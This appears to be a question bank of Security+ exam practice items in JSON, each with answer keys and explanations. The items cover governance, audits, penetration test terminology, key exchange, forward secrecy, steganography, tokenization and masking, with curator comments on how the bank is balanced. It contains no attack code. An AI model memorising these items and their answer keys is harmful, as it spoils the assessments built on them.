    {"type":"mcq","question":"An organization's security documentation states: 'All passwords must be at least 14 characters and include three different character types.' Within the governance document hierarchy, this mandatory and specific requirement is BEST classified as which of the following?","difficulty":"Hard","topic":"Security Governance","objective":"5.1","options":{"A":"Guideline","B":"Standard","C":"Policy","D":"Procedure"},"answer":"B","explanation":"A standard is a mandatory, specific rule that supports a broader policy — a password standard fixing exact length and complexity parameters is the textbook example. (A) Wrong — a guideline is a recommended, non-mandatory best practice phrased with words like 'should,' whereas this requirement is compulsory and precise. (C) Wrong — a policy is the high-level statement of management intent (for example, 'the organization will protect authentication credentials') and deliberately omits granular parameters like a 14-character minimum. (D) Wrong — a procedure is a step-by-step how-to (such as the exact steps to reset a password), not a measurable rule about what a password must contain. The mandatory, specific parameter is a standard.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"mcq","question":"A cloud provider engages an accredited outside firm to examine its controls and issue a formal, signed opinion that customers can rely on as evidence of compliance. Which type of assessment BEST describes this?","difficulty":"Exam Level","topic":"Audits & Assessments","objective":"5.5","options":{"A":"Internal self-assessment","B":"Internal audit performed by the organization's audit committee","C":"Independent third-party audit","D":"Active reconnaissance engagement"},"answer":"C","explanation":"An independent third-party audit uses an accredited external firm to evaluate controls and produce a formal attestation (such as a SOC 2 report) that external customers can trust because the assessor is independent of the organization. (A) Wrong — a self-assessment is conducted internally by the organization on itself, giving limited assurance to outside parties who need independence. (B) Wrong — an internal audit by the audit committee is still first-party work performed within the organization and lacks the external independence customers require for reliance. (D) Wrong — active reconnaissance is a probing phase of a penetration test that interacts directly with targets, not a controls audit that yields an attestation. The described external, accredited, opinion-issuing engagement is an independent third-party audit.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"mcq","question":"A company hires a penetration testing team and, before the engagement begins, provides them with full network diagrams, application source code, and administrative documentation. Using current CompTIA terminology, this engagement is BEST described as which type of environment?","difficulty":"Hard","topic":"Audits & Assessments","objective":"5.5","options":{"A":"Known environment","B":"Unknown environment","C":"Partially known environment","D":"Integrated environment"},"answer":"A","explanation":"A known environment test gives the tester complete prior knowledge — diagrams, source code, and credentials — enabling thorough, efficient coverage; this is the current term replacing the deprecated 'white box.' (B) Wrong — an unknown environment provides the tester no prior information, simulating an external attacker with zero inside knowledge (formerly 'black box'), which contradicts handing over full documentation. (C) Wrong — a partially known environment supplies only limited information (formerly 'gray box'), not the complete diagrams and source code described here. (D) Wrong — 'integrated' refers to offensive and defensive teams collaborating during the test, not to how much knowledge the tester is given. Full documentation up front defines a known environment.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"mcq","question":"During the reconnaissance phase of a penetration test, the tester gathers information about the target solely by reviewing public DNS records, WHOIS data, and the company's public website, without sending any traffic that touches the target's own systems. Which technique is the tester using?","difficulty":"Hard","topic":"Audits & Assessments","objective":"5.5","options":{"A":"Active reconnaissance","B":"Offensive vulnerability scanning of the target's exposed hosts","C":"Exploitation of a discovered vulnerability to gain a foothold","D":"Passive reconnaissance"},"answer":"D","explanation":"Passive reconnaissance collects information from public and third-party sources — OSINT, WHOIS, DNS records, and public web pages — without directly interacting with the target's systems, keeping the activity difficult for the target to detect. (A) Wrong — active reconnaissance directly probes the target with port scans, ping sweeps, or banner grabbing, generating traffic the target can observe, which is the opposite of what is described. (B) Wrong — scanning the target's exposed hosts sends packets to those systems, making it active interaction, not passive information gathering. (C) Wrong — exploiting a vulnerability is a later attack phase focused on gaining access, not reconnaissance at all. Reviewing only public sources with no target interaction is passive reconnaissance.","source":"curated-secplus-phase3","addedVersion":"7.65.0","addedDate":"2026-07-10"},
    {"type":"mcq","question":"A hospital encrypts its patient database files, uses TLS for its web portal, and is now evaluating secure enclaves to protect records while they are actively being processed in memory. Which data state does the secure enclave protect?","difficulty":"Exam Level","topic":"Data Protection","objective":"3.3","options":{"A":"Data at rest","B":"Data in transit","C":"Data in use","D":"Data in escrow"},"answer":"C","explanation":"Data actively being processed in memory is data IN USE — the third and hardest-to-protect state, addressed by access controls, memory protection, and secure enclaves. Database files on disk are data at rest (A), protected here by database encryption. TLS traffic is data in transit (B). 'Data in escrow' (D) is not a data state — escrow refers to third-party key custody. Memory trick: Rest, Route, Running — rest = stored, route = moving, running = processing.","source":"curated-lesson-encrypting-data","addedVersion":"7.80.0","addedDate":"2026-07-20"},
    {"type":"mcq","question":"A sales laptop protected with BitLocker full-disk encryption is stolen from a car. The thief removes the SSD and connects it to another computer to read it. Separately, the security team notes what FDE would NOT have prevented if the same laptop had instead been infected with malware while the user was logged in. Which statement correctly describes both scenarios?","difficulty":"Exam Level","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"The stolen SSD is readable in the second computer, and FDE would have blocked the malware","B":"The stolen SSD is unreadable without the key, but FDE would not have stopped the malware from reading files through the logged-in session","C":"Both the stolen SSD and the malware scenario are fully mitigated by FDE","D":"FDE protects neither scenario; only file-level encryption helps here"},"answer":"B","explanation":"FDE's core win is the offline-attack scenario: a removed drive is ciphertext without the unlock secret (password/PIN/TPM/recovery key). Its core limitation is that once the authorized user has unlocked the disk, everything is transparently decrypted for that session — malware running under the logged-in account reads files exactly as the user can. This is the classic Security+ FDE trap: strong against lost/stolen devices and offline attacks, weak after login.","source":"curated-lesson-encrypting-data","addedVersion":"7.80.0","addedDate":"2026-07-20"},
    ...
    {"type":"multi-select","question":"(Choose TWO) A remote employee's browser already uses HTTPS for every site. The security team still requires a TLS-based remote-access VPN before reaching internal resources. Which statements accurately describe what the VPN adds beyond per-site HTTPS?","difficulty":"Hard","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"The VPN can encrypt traffic from ALL applications routed through the tunnel, not just the browser's TLS-capable traffic","B":"The VPN creates an encrypted tunnel across the untrusted network into the protected environment, gating access to internal-only resources","C":"The VPN re-encrypts each HTTPS session with a second TLS layer, doubling the cryptographic strength of the same traffic","D":"The VPN replaces the need for TLS on internal web applications permanently","E":"HTTPS and VPNs use incompatible encryption, so the browser must disable TLS inside the tunnel"},"answers":["A","B"],"explanation":"A and B capture the application-vs-network distinction: a browser's TLS protects that application's traffic only, while a VPN encrypts whatever traffic is routed through the tunnel — legacy apps, file shares, DNS — regardless of which application generated it, and it provides the encrypted path into the company network (client/remote-access VPNs are commonly TLS-based; site-to-site VPNs commonly use IPsec at the network layer). C is a distractor — tunneled HTTPS is indeed doubly wrapped, but 'doubling cryptographic strength' is not why VPNs are deployed. D is backwards (defense in depth keeps internal TLS), and E is fabricated.","source":"curated-lesson-encrypting-data","addedVersion":"7.80.0","addedDate":"2026-07-20"},

    // ── Key Exchange (v7.98.0, 2026-07-24) ──────────────────────────────────
    // Source: user studied key exchange from personal lesson notes (2026-07-24).
    // Audit confirmed zero standalone MCQs on DH, ECDHE, PFS, hybrid encryption,
    // key transport, or key agreement existed in the Sec+ bank pre-this cycle.
    // 11 exemplars across 7 sub-topics: out-of-band vs in-band, key transport vs
    // key agreement, DH scope (does NOT encrypt data), ECDH vs ECDHE (ephemeral),
    // MitM via unauthenticated DH, session key rationale, hybrid encryption,
    // forward secrecy wording, and KDF role. All original from SY0-701 obj 1.4.
    {"type":"mcq","question":"An attacker records all TLS traffic to a company's public web server for 18 months. Two years later the attacker compromises the server and obtains its long-term private key. The server had been configured to use ECDHE cipher suites throughout that period. Which outcome is MOST likely regarding the recorded traffic?","difficulty":"Exam Level","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"The attacker can decrypt all 18 months of recorded sessions using the stolen private key","B":"The attacker can decrypt only sessions that occurred in the final month before the key was stolen","C":"The previously recorded sessions remain protected because each session used temporary ephemeral key material that was discarded","D":"The attacker can decrypt the sessions but only after factoring the server's RSA public key"},"answer":"C","explanation":"ECDHE (Elliptic Curve Diffie-Hellman Ephemeral) generates fresh temporary private values for every session. Those ephemeral values are discarded when the session ends. The server's long-term private key authenticated the handshake but did not encrypt — or contribute to — the session keys themselves. Stealing it later gives the attacker nothing useful for past traffic. This is the defining property of perfect forward secrecy (PFS): past session confidentiality survives a future key compromise. Exam wording to recognize: 'protects previously recorded sessions if a long-term key is later compromised' always maps to ephemeral key exchange and forward secrecy.","source":"curated-lesson-key-exchange","addedVersion":"7.98.0","addedDate":"2026-07-24"},
    {"type":"mcq","question":"During a TLS handshake, the client generates a random symmetric session key, encrypts it with the server's public key obtained from the server's certificate, and transmits it to the server. The server decrypts it with its corresponding private key. Both sides now share the session key. Which key establishment method does this describe?","difficulty":"Exam Level","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"Key agreement — both parties independently calculate the same shared secret","B":"Key transport — one party creates the key and securely delivers it to the other","C":"Out-of-band key exchange — the key is delivered on a separate channel","D":"Key derivation — both parties apply a KDF to generate the same key from a master secret"},"answer":"B","explanation":"Key transport is the method where one party generates the symmetric key and then delivers it to the other party — here the client generates the key and sends it encrypted under the server's public key. The alternative is key agreement (A), where both parties each contribute values and independently compute the same shared secret without it ever crossing the network — Diffie-Hellman is the canonical example. Modern TLS 1.3 prefers key agreement (ECDHE) over key transport because agreement supports forward secrecy natively. Out-of-band (C) uses a separate communication channel. Key derivation (D) happens after a shared secret is established, not to establish it.","source":"curated-lesson-key-exchange","addedVersion":"7.98.0","addedDate":"2026-07-24"},
    {"type":"mcq","question":"A security architect reviews a TLS 1.3 connection and notes it uses ECDHE for key establishment followed by AES-256-GCM to protect application data. Which statement about ECDHE's role in this connection is accurate?","difficulty":"Exam Level","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"ECDHE encrypts the application data using elliptic-curve operations for each packet","B":"ECDHE establishes shared secret material; a separate symmetric cipher encrypts the actual data","C":"ECDHE generates a public/private key pair that is reused across multiple sessions for efficiency","D":"ECDHE provides server authentication, eliminating the need for a digital certificate"},"answer":"B","explanation":"Diffie-Hellman (including its elliptic-curve and ephemeral variants) is a key-agreement protocol — it produces shared secret material from which session keys are derived. It does not encrypt application data. The actual traffic is encrypted by a fast symmetric cipher (here AES-256-GCM). Common exam trap: confusing DH with an encryption algorithm. C is wrong — ECDHE specifically generates new temporary values per session (that is what 'Ephemeral' means); reuse across sessions would remove forward secrecy. D is wrong — ECDHE alone provides no authentication; certificates and digital signatures handle that separately.","source":"curated-lesson-key-exchange","addedVersion":"7.98.0","addedDate":"2026-07-24"},
    {"type":"mcq","question":"A company requires its new VPN to provide forward secrecy so that compromising the VPN server's private key in the future cannot expose past session traffic. Which algorithm selection meets this requirement?","difficulty":"Exam Level","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"RSA key transport — the client encrypts the session key with the server's RSA public key","B":"ECDH — elliptic curve Diffie-Hellman key agreement","C":"ECDHE — ephemeral elliptic curve Diffie-Hellman key agreement","D":"AES-256-GCM — symmetric authenticated encryption"},"answer":"C","explanation":"Forward secrecy requires that new temporary key material be generated for each session and discarded afterward, so that the long-term private key cannot retroactively decrypt past traffic. ECDHE provides this: the 'E' (Ephemeral) means fresh temporary private values are generated per session. ECDH without the E (B) can reuse static key material and does not guarantee forward secrecy. RSA key transport (A) encrypts the session key under the server's long-term public key — if that private key is ever stolen, every past session using it can be decrypted. AES-256-GCM (D) is the symmetric cipher that encrypts session data after key establishment; it is not a key-exchange mechanism.","source":"curated-lesson-key-exchange","addedVersion":"7.98.0","addedDate":"2026-07-24"},
    {"type":"mcq","question":"Two parties complete a Diffie-Hellman key exchange and arrive at a shared secret. No certificates or pre-shared keys were used during the exchange. A security analyst warns that a specific attack is now possible. Which attack and which property is MISSING?","difficulty":"Hard","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"Replay attack — the exchange lacks a nonce to prevent replayed handshakes","B":"Brute-force attack — a 2048-bit DH group is too small for modern security","C":"Man-in-the-middle attack — the exchange lacks authentication to prove who each party is","D":"Collision attack — the shared secret may accidentally equal a known value"},"answer":"C","explanation":"Basic Diffie-Hellman allows two systems to establish a shared secret, but it does not by itself prove who those systems are. Without authentication, an attacker can intercept both parties' public values and substitute their own, establishing separate shared secrets with each party while neither Alice nor Bob realizes the attacker is in the middle. The missing property is authentication. In real deployments, DH is authenticated by pairing it with digital certificates (as in TLS), pre-shared keys (as in IKE), or digital signatures. Exam wording: 'unauthenticated key exchange is vulnerable to man-in-the-middle.'","source":"curated-lesson-key-exchange","addedVersion":"7.98.0","addedDate":"2026-07-24"},
    {"type":"mcq","question":"A risk analyst asks why HTTPS sessions use a fresh session key for each connection rather than a single long-term symmetric key stored on the server. Which explanation BEST justifies the use of per-session keys?","difficulty":"Exam Level","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"Session keys must be unique because symmetric algorithms cannot reuse the same key with different initialization vectors","B":"If a single long-term key is compromised, all past and future traffic it protected is exposed; session keys limit the blast radius to one session","C":"Session keys are required by TLS to meet the TCP three-way handshake overhead requirements","D":"Session keys are easier to distribute because they can be sent in cleartext at the start of each connection"},"answer":"B","explanation":"A session key is a temporary symmetric key scoped to one connection (or a limited amount of data). If a session key is compromised, only that one session is exposed — not months or years of traffic. Using a single long-term key would mean its compromise exposes everything ever protected by it. This principle also connects to forward secrecy: ephemeral key exchange ensures each session's key material is independent of the long-term private key. A is incorrect — symmetric algorithms can reuse keys (though IVs must vary); that is not why sessions use fresh keys. C and D are fabricated.","source":"curated-lesson-key-exchange","addedVersion":"7.98.0","addedDate":"2026-07-24"},
    {"type":"mcq","question":"A government agency distributes encryption keys to classified field offices by delivering physical USB drives via armed courier rather than transmitting keys over any network. Which key exchange method does this describe?","difficulty":"Foundational","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"In-band key exchange — the key is distributed using the same network that will carry the encrypted traffic","B":"Key agreement — both parties independently calculate the same shared secret","C":"Out-of-band key exchange — the key is delivered over a separate communication channel","D":"Key transport over TLS — the key is encrypted under an asymmetric key before network delivery"},"answer":"C","explanation":"Out-of-band key exchange delivers key material through a channel that is separate from the one used for encrypted communication. Here the encrypted data travels over government networks while the key travels physically via courier — an attacker must compromise both channels independently. Contrast with in-band key exchange (A), where key establishment and data transmission share the same network (as in HTTPS). Out-of-band is common in high-security environments, for pre-shared key distribution, or when one side lacks network connectivity.","source":"curated-lesson-key-exchange","addedVersion":"7.98.0","addedDate":"2026-07-24"},
    {"type":"mcq","question":"A browser connects to an e-commerce site. During the TLS handshake, ECDHE establishes shared secret material, which is then processed by a key derivation function to produce session keys. AES-GCM encrypts the actual HTTP traffic. Which term BEST describes the overall approach of combining these two cryptographic methods?","difficulty":"Exam Level","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"Out-of-band key exchange","B":"Key transport","C":"Hybrid encryption","D":"Symmetric-only encryption"},"answer":"C","explanation":"Hybrid encryption combines asymmetric or key-agreement cryptography (here ECDHE) for key establishment with a fast symmetric cipher (here AES-GCM) for bulk data encryption. The asymmetric/agreement phase solves the key-distribution problem; the symmetric phase handles the actual data efficiently. This is the standard architecture of every modern secure protocol: TLS, SSH, IPsec, Signal, PGP all use hybrid encryption. Key transport (B) is one type of key establishment, not a description of the combined approach. Symmetric-only (D) would mean no asymmetric phase. Out-of-band (A) describes the delivery channel, not an encryption architecture.","source":"curated-lesson-key-exchange","addedVersion":"7.98.0","addedDate":"2026-07-24"},
    {"type":"mcq","question":"After an ECDHE key exchange completes, both systems hold the same shared secret. The systems then pass this value through HKDF before generating their encryption and MAC keys. What is the purpose of this step?","difficulty":"Hard","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"HKDF encrypts the shared secret so it can be safely transmitted to a certificate authority for escrow","B":"HKDF compresses the shared secret to reduce the number of bits that must be stored","C":"HKDF derives cryptographically strong, purpose-separated keying material from the raw shared secret","D":"HKDF verifies that both parties calculated the same shared secret before the session begins"},"answer":"C","explanation":"A key derivation function (KDF) such as HKDF takes raw shared secret material — which may not be uniformly random or long enough — and produces keying material with strong cryptographic properties. In TLS 1.3, HKDF generates separate keys for client-write, server-write, and MAC operations from a single shared secret. The KDF also mixes in nonces, handshake transcripts, and context labels to ensure each derived key is unique and purpose-bound. KDFs do NOT transmit the secret (A), compress it (B), or verify equality (D) — equality is verified separately via Finished messages.","source":"curated-lesson-key-exchange","addedVersion":"7.98.0","addedDate":"2026-07-24"},
    {"type":"multi-select","question":"(Choose TWO) Which statements correctly distinguish key transport from key agreement as key establishment methods?","difficulty":"Hard","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"In key transport, one party generates the symmetric key and delivers it to the other; in key agreement, both parties contribute values and independently calculate the same shared secret","B":"Key transport using RSA can provide perfect forward secrecy if the RSA key is rotated annually","C":"Key agreement methods such as Diffie-Hellman never cross the network with the final shared secret itself","D":"Key transport is always preferred in TLS 1.3 because it requires fewer round trips than key agreement","E":"Key agreement requires a certificate authority to broker the shared secret between the two parties"},"answers":["A","C"],"explanation":"A and C are the defining distinctions. (A) Key transport: one party creates the key and encrypts it for the other (classic RSA key transport). Key agreement: both parties exchange public values and each independently computes the same result — neither side 'sends' the final key. (C) In Diffie-Hellman, public values (g^a and g^b mod p) travel the network; the shared secret (g^ab mod p) is computed locally on each side and never transmitted. (B) is wrong — RSA key transport does NOT provide forward secrecy regardless of rotation frequency, because the static private key could be stolen and used to decrypt any stored past session where the client-encrypted session key was captured. (D) is reversed — TLS 1.3 removed RSA key transport entirely and mandates key agreement (ECDHE) specifically because agreement enables forward secrecy. (E) is wrong — key agreement is peer-to-peer; no CA is involved in the DH computation.","source":"curated-lesson-key-exchange","addedVersion":"7.98.0","addedDate":"2026-07-24"},
    {"type":"multi-select","question":"(Choose TWO) Which of the following are TRUE regarding perfect forward secrecy (PFS)?","difficulty":"Hard","topic":"Cryptography Fundamentals","objective":"1.4","options":{"A":"PFS ensures that traffic recorded today cannot be decrypted by an attacker who obtains the server's long-term private key at a future date","B":"PFS is achieved when a session key is derived from a static Diffie-Hellman key pair that is reused across all sessions","C":"Ephemeral key exchange (DHE or ECDHE) is the mechanism that enables PFS because each session's key material is temporary and discarded","D":"PFS guarantees that no future compromise of any key can ever decrypt any past or future session","E":"Enabling PFS on a TLS server requires storing the per-session ephemeral private values in a database for potential audit retrieval"},"answers":["A","C"],"explanation":"(A) is the canonical PFS definition — recorded ciphertext remains secure even after future private-key theft, because past session keys were ephemeral and unrelated to the long-term key. (C) is the mechanism — DHE and ECDHE generate fresh private values per session and discard them, breaking the link between the long-term private key and session encryption. (B) is wrong — a static (non-ephemeral) DH key pair reused across sessions does NOT provide forward secrecy; the 'E' in DHE/ECDHE is what makes it ephemeral. (D) overstates the guarantee — PFS protects past sessions from future compromise of the long-term key; it does not protect the current session if the current session key is directly compromised, and it says nothing about future sessions. (E) is wrong AND would defeat PFS — the whole point is that ephemeral private values are destroyed when the session ends; storing them creates the very long-term exposure PFS is designed to prevent.","source":"curated-lesson-key-exchange","addedVersion":"7.98.0","addedDate":"2026-07-24"},
    {"type":"mcq","question":"A forensic analyst finds that an employee has been emailing holiday photos to a personal address. Examination of the images shows confidential design documents embedded in the least significant bits of the pixel data. Which technique did the employee use?","difficulty":"Exam Level","topic":"Obfuscation","objective":"1.4","options":{"A":"Encryption","B":"Steganography","C":"Tokenization","D":"Data masking"},"answer":"B","explanation":"Steganography conceals data inside an ordinary-looking carrier — here, an image whose least significant bits were altered so the change is invisible to the eye. The goal is to hide that a message exists at all. (A) Wrong — encryption leaves the ciphertext plainly visible; it makes content unreadable rather than hidden, and would have looked obviously like an encrypted blob. (C) Wrong — tokenization substitutes a non-sensitive value for a sensitive one; it does not embed anything inside a carrier file. (D) Wrong — masking hides part of a value from view (****1234); it does not smuggle data inside another file. Memory trick: Hide, Replace, Cover — steganography hides, tokenization replaces, masking covers.","source":"curated-lesson-obfuscation","addedVersion":"8.7.0","addedDate":"2026-07-27"},
    {"type":"mcq","question":"An organisation's policy states that steganography alone is NOT sufficient to protect classified data being sent outside the network. Which statement BEST justifies that policy?","difficulty":"Exam Level","topic":"Obfuscation","objective":"1.4","options":{"A":"Steganography conceals that a message exists, but the message is readable once it is extracted","B":"Steganography permanently destroys the original data","C":"Steganography requires a key-escrow service that the organisation does not operate","D":"Steganography can only be applied to plaintext files under 1 MB"},"answer":"A","explanation":"Steganography protects the FACT of the message, not its contents. Anyone who detects the carrier and knows the embedding method recovers the payload in the clear — which is why steganography is layered with encryption when the content itself is sensitive. (B) Wrong — the original data is preserved; that is the entire point of embedding it. (C) Wrong — steganography does not depend on key escrow; that is a key-management concept. (D) Wrong — fabricated limit; video and audio carriers routinely hide far more. Exam clue: 'hidden inside an image/audio/video/packet' points to steganography; 'unreadable without a key' points to encryption.","source":"curated-lesson-obfuscation","addedVersion":"8.7.0","addedDate":"2026-07-27"},
    {"type":"mcq","question":"A security team detects small amounts of data leaving the network encoded in unused TCP/IP header fields and in the timing between packets. No file transfer or email is involved. Which technique is being used to exfiltrate the data?","difficulty":"Exam Level","topic":"Obfuscation","objective":"1.4","options":{"A":"Network-based steganography","B":"Protocol downgrade attack","C":"Tokenization of the payload","D":"Dynamic data masking"},"answer":"A","explanation":"Hiding information inside network traffic — unused or optional header fields, sequence numbers, or inter-packet timing — is network-based steganography, often called a covert channel. It is attractive to attackers precisely because no obvious file transfer appears in the logs. (B) Wrong — a downgrade attack forces a weaker protocol or cipher; it attacks negotiation rather than hiding data. (C) Wrong — tokenization is a data-protection control applied by the data owner, not an exfiltration method. (D) Wrong — dynamic masking limits what a viewer sees from a database based on permissions; it has nothing to do with packet headers.","source":"curated-lesson-obfuscation","addedVersion":"8.7.0","addedDate":"2026-07-27"},
    {"type":"mcq","question":"A payment processor replaces each stored card number with an unrelated value that has no meaningful mathematical relationship to the original. The original card number can be retrieved only by sending that value to an authorised lookup service. Which technique is described?","difficulty":"Exam Level","topic":"Obfuscation","objective":"1.4","options":{"A":"Hashing","B":"Tokenization","C":"Symmetric encryption","D":"Steganography"},"answer":"B","explanation":"Tokenization substitutes a non-sensitive token for the sensitive value and keeps the token-to-original mapping in a protected token vault or token service. Retrieval is a secure LOOKUP, not a computation. (A) Wrong — hashing is designed to be one-way and is not reversed by a service holding the original; this is the most common trap on this objective. (C) Wrong — encryption is reversed mathematically with a key, whereas a token is not derived from the card number at all. (D) Wrong — nothing is being hidden inside a carrier. Exam clue: 'token vault' or 'replacement value with no mathematical relationship' means tokenization.","source":"curated-lesson-obfuscation","addedVersion":"8.7.0","addedDate":"2026-07-27"},
    {"type":"mcq","question":"A customer registers a credit card with a mobile payment service. At checkout the phone transmits a substitute value instead of the card number, and that value is only accepted for that specific device. If an attacker captures the transmitted value, why is its usefulness limited?","difficulty":"Exam Level","topic":"Obfuscation","objective":"1.4","options":{"A":"The value is a token bound to that device and must be resolved by the token service to reach a real card","B":"The value is a salted hash that reverses only with the customer's PIN","C":"The value is the card number encrypted with the merchant's public key","D":"The value is the card number with the middle digits masked"},"answer":"A","explanation":"The transmitted value is a token. It carries no card data itself, and the token service can restrict it to a particular device, merchant, or transaction type — so a captured token is largely worthless outside that context. This is a major reason tokenization reduces PCI-DSS scope. (B) Wrong — hashes are not reversed with a PIN, and a payment cannot be settled from a hash. (C) Wrong — if it were the encrypted card number it would still represent the real card and be reusable wherever that key applies. (D) Wrong — a masked card number is still the card number with characters hidden from view, not a substitute value.","source":"curated-lesson-obfuscation","addedVersion":"8.7.0","addedDate":"2026-07-27"},
    {"type":"mcq","question":"Customer service representatives at a retailer see card numbers displayed as **** **** **** 1234 in the support application. The complete number is still held in the payment database. Which technique is in use?","difficulty":"Exam Level","topic":"Obfuscation","objective":"1.4","options":{"A":"Data masking","B":"Tokenization","C":"Hashing","D":"Steganography"},"answer":"A","explanation":"Data masking hides part or all of a value from view while the underlying data remains stored. Showing only the last four digits is the textbook example, and it lets an agent confirm a card with a customer without exposing the full number. (B) Wrong — with tokenization the application would hold a substitute value, not a partially hidden version of the real one. (C) Wrong — a hash would not preserve the real last four digits in readable form. (D) Wrong — nothing is concealed inside a carrier file. Exam clue: 'only the last four digits are displayed' means masking. Trap: masked does NOT mean deleted — the full value still exists in storage.","source":"curated-lesson-obfuscation","addedVersion":"8.7.0","addedDate":"2026-07-27"},
    {"type":"mcq","question":"A development team needs a realistic dataset to test a new billing feature but must not receive real customer information. The DBA produces a copy of the production database in which names, addresses and card numbers have been permanently replaced with fictitious but realistic values. Which technique BEST describes this?","difficulty":"Exam Level","topic":"Obfuscation","objective":"1.4","options":{"A":"Static data masking","B":"Dynamic data masking","C":"Tokenization","D":"Full-disk encryption"},"answer":"A","explanation":"Static data masking creates a separate, sanitised COPY in which sensitive values are permanently replaced. The copy is safe to hand to a non-production environment because the real values are simply not present in it. (B) Wrong — dynamic masking leaves one dataset in place and varies what each viewer is shown at query time, so the developers would still be querying production. (C) Wrong — tokenization keeps a recoverable mapping back to the real values, which is exactly what you do not want in a test environment. (D) Wrong — full-disk encryption protects data at rest from someone who takes the disk; an authorised developer querying the database would still see real customer records.","source":"curated-lesson-obfuscation","addedVersion":"8.7.0","addedDate":"2026-07-27"},
    {"type":"mcq","question":"A database is configured so that the same SELECT statement returns a full national identification number to a database administrator but returns ***-**-6789 to a call-centre agent. The stored value is never altered. Which technique is in use?","difficulty":"Exam Level","topic":"Obfuscation","objective":"1.4","options":{"A":"Dynamic data masking","B":"Static data masking","C":"Field-level tokenization","D":"Data classification"},"answer":"A","explanation":"Dynamic data masking applies the mask at query time according to the requester's authorisation, so one stored value is presented differently to different roles. Nothing in the database is rewritten. (B) Wrong — static masking would have produced a separate sanitised copy, and the DBA could not then retrieve the true value from it. (C) Wrong — tokenization replaces the stored value itself with a substitute, whereas here the stored value is unchanged. (D) Wrong — classification labels data by sensitivity (public, confidential, restricted); it informs which controls to apply but does not itself hide anything.","source":"curated-lesson-obfuscation","addedVersion":"8.7.0","addedDate":"2026-07-27"},
    {"type":"mcq","question":"A vendor argues that its in-house network protocol is secure because the specification is confidential and attackers do not know how it works. No encryption or authentication is implemented. Which concept BEST describes the vendor's position?","difficulty":"Exam Level","topic":"Obfuscation","objective":"1.4","options":{"A":"Security through obscurity — a secret design does not survive reverse engineering or disclosure","B":"Defence in depth — the protocol forms one of several independent layers","C":"Zero trust — the protocol assumes no implicit trust between endpoints","D":"Non-repudiation — the protocol proves which party sent each message"},"answer":"A","explanation":"Relying on secrecy of the design rather than on real controls is security through obscurity. It can slow an attacker down, but a system should stay secure even once an adversary fully understands how it works — and protocols are routinely reverse engineered or leaked. Obscurity is acceptable only as a supplement to encryption, authentication, access control and monitoring, never as a substitute. (B) Wrong — there is only one measure here, and defence in depth requires multiple independent layers. (C) Wrong — zero trust continuously verifies every request; this design verifies nothing. (D) Wrong — with no authentication there is nothing binding a message to a sender, so non-repudiation is absent.","source":"curated-lesson-obfuscation","addedVersion":"8.7.0","addedDate":"2026-07-27"},
    {"type":"multi-select","question":"(Choose TWO) Which statements about data masking are correct?","difficulty":"Exam Level","topic":"Obfuscation","objective":"1.4","options":{"A":"Display masking may hide a value on screen while the complete value remains in storage","B":"Static masking produces a sanitised copy suitable for non-production environments","C":"Masking permanently removes the sensitive value from every system that holds it","D":"Dynamic masking requires the database to store a second, redacted copy of each record","E":"Masked data can never be used for application testing"},"answers":["A","B"],"explanation":"A and B are correct. Display masking is a presentation-layer control — the full value is usually still in the database, which is why masking alone does not replace access control or encryption (A). Static masking creates a sanitised copy precisely so developers and testers can work with realistic data without receiving real records (B). C is wrong and is a common trap — masked on screen does not mean deleted from storage. D is wrong — dynamic masking transforms results at query time from the single stored value; no second copy is kept. E is wrong and contradicts B — producing safe test data is one of masking's main uses.","source":"curated-lesson-obfuscation","addedVersion":"8.7.0","addedDate":"2026-07-27"},
    {"type":"multi-select","question":"(Choose TWO) Which statements correctly distinguish obfuscation from encryption?","difficulty":"Exam Level","topic":"Obfuscation","objective":"1.4","options":{"A":"Encryption uses a cryptographic algorithm and key, whereas obfuscation may simply make information harder to interpret","B":"Obfuscation can conceal the existence of data, which encryption by itself does not","C":"Obfuscated data is always mathematically impossible to recover","D":"Obfuscation provides the same confidentiality assurance as a strong cipher such as AES-256","E":"Encryption and obfuscation cannot be applied to the same data"},"answers":["A","B"],"explanation":"A and B are correct. Encryption is a cryptographic operation whose strength rests on the algorithm and key, while obfuscation is the broader idea of disguising, substituting or concealing information (A). Steganography in particular hides that data exists at all, which ciphertext does not — an encrypted file is obviously an encrypted file (B). C is wrong — obfuscated information is usually recoverable by anyone who knows the technique used. D is wrong, and is the central trap on this objective: obfuscation is not equivalent to encryption and must not be relied on for confidentiality. E is wrong — encrypting a payload and then hiding it with steganography is the recommended combination, since discovering the carrier still does not reveal the contents.","source":"curated-lesson-obfuscation","addedVersion":"8.7.0","addedDate":"2026-07-27"},

    // ── Hashing & Digital Signatures (v8.8.0, 2026-07-29) ─────────────────
    // Source: founder study session on hashing + digital signatures (2026-07-29).
    // Audit confirmed the bank had ZERO standalone MCQs on salting, collisions,
    // MD5/SHA-1 weakness, password-hashing algorithm choice, or the sign/verify
    // key direction. The 3 pre-existing signature exemplars (obj 1.2) cover
    // non-repudiation only.
    //
    // DELIBERATE DOMAIN SPREAD — only 3 of these 12 sit in Domain 1. The D1
    // guard in tests/uat/120 was widened twice by obj 1.4 lessons and carries a
    // DO NOT WIDEN AGAIN note, so the applied half of this lesson is tagged to
    // the objectives it genuinely belongs to: 2.4 cryptographic attacks
    // (collision, rainbow table, offline guessing), 4.6 password concepts,
    // 4.9 evidence integrity, 4.5 DKIM, 4.1 code signing. D1 lands at 29.9%
    // (under the 31% ceiling) and D2/D4 grow, which is the rebalance that note
    // asked for. 'Web & Cryptographic Attacks' goes from 0 exemplars to 4.
    //
    // Every named exam trap is the correct answer to an explicit question:
    // hashing is not encryption, signatures are not confidentiality, a salt is
    // not secret, salting does not stop guessing, SHA-256 is wrong for password
    // storage, and a posted hash is not proof of source.
